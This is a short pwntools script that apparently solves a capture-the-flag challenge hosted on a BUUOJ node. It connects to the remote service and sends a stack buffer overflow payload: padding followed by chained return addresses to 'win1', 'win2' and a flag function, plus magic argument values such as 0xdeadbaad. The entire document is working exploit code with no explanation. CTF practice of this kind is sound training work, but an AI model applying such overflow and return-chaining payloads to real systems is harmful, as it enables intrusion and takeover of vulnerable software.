from pwn import *


r = remote('node5.buuoj.cn', 28298)

context.log_level = 'debug'

flag_addr = 0x804862B
win1_addr = 0x80485CB
win2_addr = 0x80485D8
a1_value = 0xdeadbaad  # print(hex((-559039827) & 0xFFFFFFFF))
win2_a1_value = 0xbaaaaaad  # print(hex((-1163220307) & 0xFFFFFFFF))

payload = b'A' * (0x18 + 4) + p32(win1_addr) + p32(win2_addr) + p32(flag_addr) + p32(win2_a1_value) + p32(a1_value)
r.sendlineafter(b'input> ', payload)
print(r.recvline())
